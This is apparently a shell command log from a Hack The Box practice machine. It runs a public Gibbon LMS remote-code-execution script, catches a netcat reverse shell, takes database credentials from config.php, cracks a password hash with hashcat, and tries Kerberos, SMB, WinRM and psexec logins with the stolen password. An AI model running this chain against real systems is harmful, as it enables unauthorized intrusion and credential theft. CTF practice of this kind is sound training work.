[2026-01-16 12:25:13] [pane=%0] [CMD] vim .ip
[2026-01-16 12:28:52] [pane=%0] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
[2026-01-16 12:34:48] [pane=%0] [CMD] ping -c 3 10.129.232.168
[2026-01-16 12:43:02] [pane=%0] [CMD] nmap -p- --min-rate=3000 -vvv 10.129.232.168 -Pn -oN nmap/theFrizzNmapOpenPorts.txt
[2026-01-16 12:46:40] [pane=%0] [CMD] ports=$(awk '/^[0-9]+\/tcp/ {print $1}' nmap/theFrizzNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)
[2026-01-16 12:46:47] [pane=%0] [CMD] echo $ports
[2026-01-16 12:47:54] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 10.10.11.51 -Pn -vvv -oN logs/nmap/theFrizzNmapServicesVersions.txt
[2026-01-16 12:48:49] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 10.129.232.168 -Pn -vvv -oN nmap/theFrizzNmapServicesVersions.txt
[2026-01-16 13:38:48] [pane=%0] [CMD] sudo vim /etc/hosts
[2026-01-16 13:40:03] [pane=%1] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz/
[2026-01-16 13:40:18] [pane=%1] [CMD] cat nmap/theFrizzNmapServicesVersions.txt
[2026-01-16 13:43:56] [pane=%0] [CMD] cat vim /etc/hosts
[2026-01-16 14:04:30] [pane=%0] [CMD] ping -c 1 frizzdc.frizz.htb
[2026-01-16 14:08:53] [pane=%0] [CMD] curl -i http://frizzdc.frizz.htb
[2026-01-16 14:11:58] [pane=%0] [CMD] : #note key ports and services
[2026-01-16 14:12:40] [pane=%0] [CMD] : #note 22/tcp SSH OpenSSH for Windows 9.5 - UNUSUAL for DC
[2026-01-16 14:13:30] [pane=%0] [CMD] : #note 53/tcp DNS (Simple DNS plus)
[2026-01-16 14:14:12] [pane=%0] [CMD] : #note 80/tcp HTTP (Apache 2.4.58 + PHP 8.2.12) - UNUSUAL FOR DC
[2026-01-16 14:14:23] [pane=%0] [CMD] : #note 88/tcp Kerberos
[2026-01-16 14:14:46] [pane=%0] [CMD] : #note 135/tcp MSRPC
[2026-01-16 14:15:05] [pane=%0] [CMD] : #note 139/tcp NetBIOS-SSN
[2026-01-16 14:15:23] [pane=%0] [CMD] : #note 445/tcp SMB (Signing REQUIRED)
[2026-01-16 14:15:37] [pane=%0] [CMD] : #note 636/tcp LDAPS
[2026-01-16 14:16:40] [pane=%0] [CMD] : #note 3268/tcp Global Catalog LDAP
[2026-01-16 14:21:51] [pane=%0] [CMD] : #note exploring the website at frizzdc.frizz.htb- Login page at http://frizzdc.frizz.htb/Gibbon-LMS/
[2026-01-16 14:26:10] [pane=%0] [CMD] ping -c 1 frizzdc.frizz.htb | tee logs/homepage.html 
[2026-01-16 14:26:37] [pane=%0] [CMD] curl -i frizzdc.frizz.htb | tee logs/homepage.html 
[2026-01-16 14:27:57] [pane=%0] [CMD] curl -i frizzdc.frizz.htb | tee logs/Gibbon-LMS.html 
[2026-01-16 14:28:18] [pane=%0] [CMD] curl -i frizzdc.frizz.htb | tee logs/homepage.html 
[2026-01-16 14:28:36] [pane=%0] [CMD] curl -i frizzdc.frizz.htb/Gibbon-LMS | tee logs/Gibbon-LMS.html 
[2026-01-16 14:28:52] [pane=%0] [CMD] curl -i http://frizzdc.frizz.htb/Gibbon-LMS | tee logs/Gibbon-LMS.html 
[2026-01-16 14:35:11] [pane=%0] [CMD] ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.232.168/FUZZ -e .php,.txt -t 2 ffuf/frizz
[2026-01-16 15:03:16] [pane=%0] [CMD] curl -L http://frizzdc.frizz.htb/Gibbon-LMS/ | tee logs/gibbon-homepage.html
[2026-01-16 15:22:49] [pane=%0] [CMD] curl -s http://frizzdc.frizz.htb/Gibbon-LMS/CHANGELOG.txt | head -20
[2026-01-16 15:23:38] [pane=%0] [CMD] curl -s http://frizzdc.frizz.htb/Gibbon-LMS/version.php
[2026-01-16 15:23:59] [pane=%0] [CMD] curl -s http://frizzdc.frizz.htb/Gibbon-LMS/composer.json | grep version
[2026-01-16 15:38:32] [pane=%0] [CMD] ffuf -u http://frizzdc.frizz.htb/Gibbon-LMS/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,401,403 -o ffuf/gibbon-fuzz.json -of json -t 40
[2026-01-17 10:43:55] [pane=%0] [CMD] cat ~/.ip
[2026-01-17 11:05:55] [pane=%0] [CMD] vim ~/.ip
[2026-01-17 11:06:42] [pane=%0] [CMD] vim sudo /etc/hosts
[2026-01-17 11:07:26] [pane=%0] [CMD] vim /etc/hosts
[2026-01-17 11:07:37] [pane=%0] [CMD] sudo vim /etc/hosts
[2026-01-17 12:42:47] [pane=%0] [CMD] searchsploit gibbon
[2026-01-17 12:54:10] [pane=%0] [CMD] : #note found an unauthenticated rce for gibbons v25 https://github.com/ulricvbs/gibbonlms-filewrite_rce
[2026-01-17 12:54:32] [pane=%0] [CMD] wget https://raw.githubusercontent.com/ulricvbs/gibbonlms-filewrite_rce/refs/heads/main/gibbonlms_cmd_shell.py
[2026-01-17 12:54:34] [pane=%0] [CMD] ll
[2026-01-17 12:54:44] [pane=%0] [CMD] chmod +x gibbonlms_cmd_shell.py
[2026-01-17 12:54:45] [pane=%0] [CMD] ll
[2026-01-17 12:55:27] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py
[2026-01-17 12:55:59] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/Gibbon-LMS/
[2026-01-17 12:57:32] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-17 12:59:52] [pane=%1] [CMD] responder
[2026-01-17 12:59:56] [pane=%1] [CMD] sudo responder
[2026-01-17 13:00:05] [pane=%1] [CMD] sudo -I responder
[2026-01-17 13:02:16] [pane=%1] [CMD] sudo responder -I tun0
[2026-01-17 13:09:35] [pane=%2] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
[2026-01-17 13:10:19] [pane=%2] [CMD] : #note the gibbonlms-filewrite-rce pulled a shell 
[2026-01-17 13:11:39] [pane=%2] [CMD] : #note reading config.php reveals a u/n & pass - MrGibbonsDB MisterGibbs!Parrot!?1
[2026-01-17 13:12:43] [pane=%0] [CMD] cd nmap
[2026-01-17 13:12:44] [pane=%0] [CMD] ll
[2026-01-17 13:12:53] [pane=%0] [CMD] cat theFrizzNmapServicesVersions.txt
[2026-01-17 13:13:48] [pane=%0] [CMD] cd ..
[2026-01-17 13:14:00] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-17 13:21:57] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-17 13:27:58] [pane=%2] [CMD] : #note used revshells.com to generate a windows reverse shell to kali attack
[2026-01-17 13:30:19] [pane=%2] [CMD] : #note revshells settings powershell #3 (Base64), shell powershell, no encoding, screenshot in logs
[2026-01-17 13:31:55] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-17 13:32:10] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-17 13:32:29] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-17 13:39:38] [pane=%2] [CMD] : #note under mysql> type resetroot.bat -- passwordsfor root and pma were deleted
[2026-01-17 13:41:53] [pane=%2] [CMD] : #note database is mysql
[2026-01-17 15:13:46] [pane=%2] [CMD] ll
[2026-01-17 15:13:48] [pane=%2] [CMD] cd evidence
[2026-01-17 15:13:49] [pane=%2] [CMD] ll
[2026-01-17 15:14:41] [pane=%2] [CMD] vim gibbonCreds.txt
[2026-01-17 15:58:48] [pane=%2] [CMD] vim gibbonCredsFull.txt
[2026-01-17 16:01:19] [pane=%3] [CMD] namethathash
[2026-01-17 16:01:38] [pane=%3] [CMD] nth 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
[2026-01-17 16:01:45] [pane=%3] [CMD] nth '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03'
[2026-01-17 16:01:51] [pane=%3] [CMD] nth --help
[2026-01-17 16:02:04] [pane=%3] [CMD] nth --text '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03'
[2026-01-17 16:12:46] [pane=%2] [CMD] hashcat -m 13100 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:13:52] [pane=%2] [CMD] vim gibbonCredsFull.txt
[2026-01-17 16:14:22] [pane=%2] [CMD] hashcat -m 13100 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:14:57] [pane=%2] [CMD] vim gibbonCredsFull.txt
[2026-01-17 16:15:07] [pane=%2] [CMD] hashcat -m 13100 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:15:19] [pane=%2] [CMD] hashcat -m 1400 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:15:28] [pane=%2] [CMD] hashcat gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:16:07] [pane=%2] [CMD] hashcat -m 1410 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:17:45] [pane=%2] [CMD] hashcat -m 1420 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:21:41] [pane=%2] [CMD] cat gibbonCredsFull.txt
[2026-01-17 16:22:02] [pane=%2] [CMD] ll
[2026-01-17 16:22:08] [pane=%2] [CMD] cd ..
[2026-01-17 16:22:09] [pane=%2] [CMD] ll
[2026-01-17 16:22:27] [pane=%2] [CMD] cd loot
[2026-01-17 16:22:27] [pane=%2] [CMD] ll
[2026-01-17 16:22:29] [pane=%2] [CMD] cd ..
[2026-01-17 16:22:30] [pane=%2] [CMD] ll
[2026-01-17 16:22:36] [pane=%2] [CMD] cd evidence
[2026-01-17 16:22:36] [pane=%2] [CMD] ll
[2026-01-17 16:22:59] [pane=%2] [CMD] vim gibbonCredsDB.txt
[2026-01-17 16:23:06] [pane=%2] [CMD] vim gibbonCredsDB.txt
[2026-01-17 16:26:08] [pane=%3] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
[2026-01-17 16:26:09] [pane=%3] [CMD] ll
[2026-01-17 16:27:40] [pane=%2] [CMD] ll
[2026-01-17 16:27:49] [pane=%2] [CMD] cat gibbonCredsFull.txt
[2026-01-17 16:28:20] [pane=%2] [CMD] cat gibbonCredsDB.txt
[2026-01-17 16:28:28] [pane=%2] [CMD] vim gibbonCredsDB.txt
[2026-01-17 16:31:14] [pane=%2] [CMD] cat gibbonCredsDB.txt
[2026-01-17 16:31:20] [pane=%2] [CMD] cat gibbonCredsFull.txt
[2026-01-17 16:37:48] [pane=%2] [CMD] : #note gibbon database connected to by using ./mysql -u"MrGibbonsDB" -p'MisterGibbs!Parrot!?1' -e"use gibbon;select * from gibbonperson" 2>&1
[2026-01-17 16:40:04] [pane=%2] [CMD] : #note gibbonperson table has user f.frizzle@frizz.htb with password hash 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 and salt /aACFhikmNopqrRTVz2489 
[2026-01-17 16:41:44] [pane=%2] [CMD] : #note hashcat gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force -- used this command to identify the hash-mode used which was 1420
[2026-01-17 16:41:55] [pane=%2] [CMD] hashcat -m 1420 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:42:37] [pane=%2] [CMD] cat gibbonCredsFull.txt
[2026-01-17 16:45:30] [pane=%2] [CMD] : #note cracked f.frissle password as Jenni_Luvs_Magic23 with  hashcat -m 1420 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force 
[2026-01-19 13:29:19] [pane=%2] [CMD] cat ~/.ip
[2026-01-19 13:29:51] [pane=%2] [CMD] vim ~/.ip
[2026-01-19 13:31:08] [pane=%2] [CMD] nxc smb 10.129.232.168 -u f.frizzle -p 'Jenni_Luvs_Magic23'
[2026-01-19 14:01:13] [pane=%2] [CMD] : #note it appears that smb does not use NTLM to authenticate users but uses kerberos
[2026-01-19 14:05:27] [pane=%2] [CMD] sudo vim /etc/hosts
[2026-01-19 14:43:58] [pane=%2] [CMD] : #note f.frizzle creds allowed us to log in through gibbon webpage. msg from IT Most workflows using PowerShell will not notice a difference (Enter-PSSession). If you do have a problem, please reach out to Fiona or Marvin between 8am and 4pm to install the pre-requisite SSH client on your Mac or Windows laptop. msg from IT desktop management tool, WAPT.
[2026-01-19 14:46:16] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-19 14:50:31] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-19 15:50:31] [pane=%2] [CMD] nxc smb 10.129.232.168 -u f.frizzle -p 'Jenni_Luvs_Magic23' -d frizz.htb --use-kcache
[2026-01-19 15:50:42] [pane=%2] [CMD] nxc smb 10.129.232.168 -u f.frizzle -p 'Jenni_Luvs_Magic23' -d frizz.htb
[2026-01-19 15:51:42] [pane=%2] [CMD] impacket-smbclient frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.232.168
[2026-01-19 15:53:22] [pane=%2] [CMD] impacket-smbclient 'f.frizzle:Jenni_Luvs_Magic23@frizz.htb'
[2026-01-19 15:54:12] [pane=%2] [CMD] ssh f.frizzle@10.129.232.168
[2026-01-19 15:56:09] [pane=%2] [CMD] impacket-smbclient 'f.frizzle:Jenni_Luvs_Magic23'@frizz.htb
[2026-01-19 15:57:16] [pane=%2] [CMD] nxc smb frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k
[2026-01-19 15:58:32] [pane=%2] [CMD] cat /etc/hosts
[2026-01-19 15:59:30] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k
[2026-01-19 16:00:23] [pane=%2] [CMD] sudo ntpdate 10.129.232.168
[2026-01-19 23:01:17] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k
[2026-01-19 23:02:10] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --show-shares
[2026-01-19 23:02:19] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --shares
[2026-01-19 23:10:27] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-tgt-file TGTfromFrizzle.txt
[2026-01-19 23:12:48] [pane=%2] [CMD] poetry
[2026-01-19 23:13:45] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-tgt TGTfromFrizzle.txt
[2026-01-19 23:14:14] [pane=%2] [CMD] sudo apt update
[2026-01-19 23:14:44] [pane=%2] [CMD] sudo apt update nxc
[2026-01-19 23:14:50] [pane=%2] [CMD] sudo apt upgrade nxc
[2026-01-19 23:15:16] [pane=%2] [CMD] pipx install git+https://github.com/Pennyw0rth/NetExec --force
[2026-01-19 23:17:08] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k -M ntlm_reflection
[2026-01-19 23:17:27] [pane=%2] [CMD] nxc -M ntlm_reflection smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k
[2026-01-19 23:18:10] [pane=%2] [CMD] nxc smb -M ntlm_reflection smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k
[2026-01-19 23:18:46] [pane=%2] [CMD] pipx ensurepath
[2026-01-19 23:19:23] [pane=%2] [CMD] nxc smb -M ntlm_reflection smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k
[2026-01-19 23:19:42] [pane=%2] [CMD] nxc smb -M ntlm_reflection frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k
[2026-01-19 23:20:17] [pane=%2] [CMD] which nxc
[2026-01-19 23:22:15] [pane=%2] [CMD] sudo apt remove netexec
[2026-01-19 23:22:31] [pane=%2] [CMD] nxc smb -M ntlm_reflection frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k
[2026-01-19 23:23:38] [pane=%2] [CMD] rm -f /home/b7h30/.nxc/workspaces/default/smb.db
[2026-01-19 23:23:42] [pane=%2] [CMD] nxc smb -M ntlm_reflection frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k
[2026-01-19 23:25:09] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k -M ntlm_reflection
[2026-01-19 23:25:44] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-tgt TGTfromFrizzle.txt
[2026-01-19 23:25:54] [pane=%2] [CMD] ll
[2026-01-19 23:28:47] [pane=%2] [CMD] cat krb5.conf
[2026-01-19 23:29:15] [pane=%2] [CMD] cat /etc/krb5.conf
[2026-01-19 23:31:07] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5 
[2026-01-19 23:31:30] [pane=%2] [CMD] sudo nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file /etc/krb5.conf
[2026-01-19 23:31:44] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file /etc/krb5.conf
[2026-01-19 23:31:51] [pane=%2] [CMD] sudo nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file /etc/krb5.conf
[2026-01-19 23:33:33] [pane=%2] [CMD] sudo /home/b7h30/.local/bin/nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file /etc/krb5.conf
[2026-01-19 23:34:57] [pane=%2] [CMD] export KRB5_CONFIG=/etc/krb5.conf
[2026-01-19 23:36:35] [pane=%2] [CMD] sudo apt install kinit
[2026-01-19 23:39:25] [pane=%2] [CMD] klist
[2026-01-19 23:39:44] [pane=%2] [CMD] nxc klist
[2026-01-19 23:40:41] [pane=%2] [CMD] sudo apt install krb5-user
[2026-01-19 23:41:10] [pane=%2] [CMD] klist
[2026-01-19 23:42:02] [pane=%2] [CMD] echo $KRB5_CONFIG=/etc/krb5.conf
[2026-01-19 23:44:21] [pane=%2] [CMD] ll
[2026-01-19 23:46:57] [pane=%2] [CMD] export KRB5CCNAME=~/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/TGTfromFrizzle.txt.ccache
[2026-01-19 23:48:18] [pane=%2] [CMD] nxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --use-kcache
[2026-01-19 23:50:47] [pane=%2] [CMD] evil-winrm -i 10.129.232.168 -u f.frizzle -k
[2026-01-19 23:55:36] [pane=%2] [CMD] KRB5CCNAME
[2026-01-19 23:57:34] [pane=%2] [CMD] export KRB5CCNAME='~/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/TGTfromFrizzle.txt.ccache' evil-winrm -i frizzDC.frizz.htb -r frizz.htb
[2026-01-19 23:58:08] [pane=%2] [CMD] KRB5CCNAME='~/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/TGTfromFrizzle.txt.ccache' evil-winrm -i frizzDC.frizz.htb -r frizz.htb
[2026-01-19 23:58:44] [pane=%2] [CMD] klist
[2026-01-19 23:59:25] [pane=%2] [CMD] KRB5CCNAME='/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/TGTfromFrizzle.txt.ccache' evil-winrm -i frizzDC.frizz.htb -r frizz.htb
[2026-01-19 23:59:32] [pane=%2] [CMD] KRB5CCNAME='Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/TGTfromFrizzle.txt.ccache' evil-winrm -i frizzDC.frizz.htb -r frizz.htb
[2026-01-19 23:59:50] [pane=%2] [CMD] KRB5CCNAME='/home/b7h30/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/TGTfromFrizzle.txt.ccache' evil-winrm -i frizzDC.frizz.htb -r frizz.htb
[2026-01-20 00:02:19] [pane=%2] [CMD] KRB5CCNAME='/home/b7h30/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/TGTfromFrizzle.txt.ccache' evil-winrm -i frizzDC.frizz.htb -r frizz.htb
[2026-01-20 00:06:14] [pane=%2] [CMD] nxc win-rm frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --use-kcache -x 'whoami'
[2026-01-20 00:06:28] [pane=%2] [CMD] nxc winrm frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --use-kcache -x 'whoami'
[2026-01-20 00:07:07] [pane=%2] [CMD] nxc winrm frizzDC.frizz.htb -u f.frizzle -p --use-kcache -x 'whoami'
[2026-01-20 00:07:17] [pane=%2] [CMD] nxc winrm frizzDC.frizz.htb -u f.frizzle --use-kcache -x 'whoami'
[2026-01-20 00:08:23] [pane=%2] [CMD] ping -c 3 10.129.232.168
[2026-01-20 00:08:47] [pane=%2] [CMD] nxc winrm frizzDC.frizz.htb
[2026-01-20 00:09:28] [pane=%3] [CMD] cd nmap
[2026-01-20 00:09:30] [pane=%3] [CMD] ll
[2026-01-20 00:09:36] [pane=%3] [CMD] cat theFrizzNmapServicesVersions.txt
[2026-01-20 00:10:22] [pane=%2] [CMD] ssh f.frizzle@10.129.232.168
[2026-01-20 16:48:50] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-20 16:49:47] [pane=%2] [CMD] ssh f.frizzle@10.129.232.168
[2026-01-20 16:51:24] [pane=%2] [CMD] impacket-smbclient frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.232.168
[2026-01-20 16:54:36] [pane=%3] [CMD] ll
[2026-01-20 16:54:49] [pane=%3] [CMD] cat theFrizzNmapServicesVersions.txt
[2026-01-20 16:56:57] [pane=%2] [CMD] ll
[2026-01-20 16:59:08] [pane=%2] [CMD] impacket-getTGT frizz.htb/f.frizzle:'JenniP_Luvs_Magic23' -dc-ip 10.129.232.168
[2026-01-20 16:59:22] [pane=%2] [CMD] impacket-getTGT frizz.htb/f.frizzle:'Jenni_Luvs_Magic23' -dc-ip 10.129.232.168
[2026-01-20 16:59:28] [pane=%2] [CMD] ll
[2026-01-20 17:07:48] [pane=%2] [CMD] ldapsearch -x -H ldap:://10.129.232.168 -D 'f.frizzle@frizz.htb' -w 'Jenni_Luvs_Magic23' -b "DC=frizz,DC=htb" "(sAMAccountName=f.frizzle)" memberOf
[2026-01-20 17:08:20] [pane=%2] [CMD] ldapsearch -x -H ldap://10.129.232.168 -D 'f.frizzle@frizz.htb' -w 'Jenni_Luvs_Magic23' -b "DC=frizz,DC=htb" "(sAMAccountName=f.frizzle)" memberOf
[2026-01-20 17:13:28] [pane=%2] [CMD] ssh frizz.htb\\f.frizzle@10.129.232.168
[2026-01-20 17:23:25] [pane=%2] [CMD] nxc winrm 10.129.232.168 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb
[2026-01-20 17:24:47] [pane=%2] [CMD] nxc winrm 10.129.232.168 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb
[2026-01-20 17:25:33] [pane=%3] [CMD] nxc winrm 10.129.232.168 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb
[2026-01-20 17:46:32] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-20 17:46:41] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-20 17:46:50] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-20 17:47:25] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-20 17:48:22] [pane=%0] [CMD] ll
[2026-01-20 17:48:33] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-20 17:49:52] [pane=%3] [CMD] cat theFrizzNmapOpenPorts.txt
[2026-01-20 17:53:33] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-20 18:00:32] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-20 20:15:59] [pane=%2] [CMD] impacket-wmiexec frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.232.168
[2026-01-20 20:18:57] [pane=%2] [CMD] impacket-wmiexec frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.232.168
[2026-01-20 20:53:38] [pane=%2] [CMD] export KRB5CCNAME='~/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/f.frizzle.cache'
[2026-01-20 20:54:29] [pane=%2] [CMD] impacket-wmiexec -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 20:54:33] [pane=%2] [CMD] ll
[2026-01-20 20:55:41] [pane=%2] [CMD] export KRB5CCNAME='~/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/f.frizzle.ccache'
[2026-01-20 20:55:45] [pane=%2] [CMD] impacket-wmiexec -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 20:57:05] [pane=%3] [CMD] cd ../evidence
[2026-01-20 20:57:06] [pane=%3] [CMD] ll
[2026-01-20 20:57:50] [pane=%3] [CMD] rm f.frizzle.ccache
[2026-01-20 20:57:53] [pane=%2] [CMD] impacket-getTGT frizz.htb/f.frizzle:'JenniP_Luvs_Magic23' -dc-ip 10.129.232.168
[2026-01-20 20:58:03] [pane=%2] [CMD] impacket-getTGT frizz.htb/f.frizzle:'Jenni_Luvs_Magic23' -dc-ip 10.129.232.168
[2026-01-20 20:59:17] [pane=%2] [CMD] export KRB5CCNAME='~/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/f.frizzle.ccache'
[2026-01-20 20:59:23] [pane=%2] [CMD] impacket-wmiexec -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 20:59:43] [pane=%2] [CMD] export KRB5CCNAME=~/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/f.frizzle.ccache
[2026-01-20 20:59:50] [pane=%2] [CMD] impacket-wmiexec -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 21:16:39] [pane=%2] [CMD] impacket-psexec -k -no-pass frixzz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 21:17:51] [pane=%2] [CMD] impacket-psexec -k -no-pass frixzz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 21:19:39] [pane=%2] [CMD] vim ~/.ip
[2026-01-20 21:20:37] [pane=%2] [CMD] sudo vim /etc/hosts
[2026-01-20 21:22:00] [pane=%2] [CMD] impacket-getTGT frizz.htb/f.frizzle:'Jenni_Luvs_Magic23' -dc-ip 10.129.68.132
[2026-01-20 21:22:05] [pane=%2] [CMD] ll
[2026-01-20 21:22:22] [pane=%2] [CMD] export KRB5CCNAME=~/Documents/obsidian/docs/CTF/HTB/theFrizz/evidence/f.frizzle.ccache
[2026-01-20 21:22:35] [pane=%2] [CMD] impacket-wmiexec -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 21:22:52] [pane=%2] [CMD] impacket-psexec -k -no-pass frixzz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 21:23:20] [pane=%2] [CMD] impacket-smbexec -k -no-pass frixzz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 21:37:30] [pane=%2] [CMD] impacket-psexec -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb
[2026-01-20 21:40:19] [pane=%2] [CMD] impacket-rpcdump frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.68.132
[2026-01-20 21:41:15] [pane=%2] [CMD] impacket-rpcdump frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.68.132 | tee impacket-rpcdump-f.frizzle.txt
[2026-01-20 21:41:18] [pane=%2] [CMD] ll
[2026-01-20 21:41:56] [pane=%2] [CMD] wc impacket-rpcdump-f.frizzle.txt
[2026-01-20 21:44:34] [pane=%2] [CMD] nmap -p 3389 -Pn 10.129.68.132
[2026-01-20 21:44:55] [pane=%2] [CMD] xfreerdp
[2026-01-20 21:45:11] [pane=%2] [CMD] sudo apt install xfreerdp3
[2026-01-20 21:47:08] [pane=%2] [CMD] xfreerdp3 /u:f.frizzle /p:'Jenni_Luvs_Magic23' /d:frizz.htb /v:10.129.68.132
[2026-01-20 21:52:03] [pane=%2] [CMD] ldapsearch -x -H ldap://10.129.68.132 -D 'f.frizzle@frizz.htb' -w 'Jenni_Luvs_Magic23' -b "DC=frizz,DC=htb" "(objectClass=user)" sAMAccountName description
[2026-01-20 21:53:29] [pane=%2] [CMD] ldapsearch -x -H ldap://10.129.68.132 -D 'f.frizzle@frizz.htb' -w 'Jenni_Luvs_Magic23' -b "DC=frizz,DC=htb" "(objectClass=user)" sAMAccountName description | tee ldapsearch_f.frizzle.txt
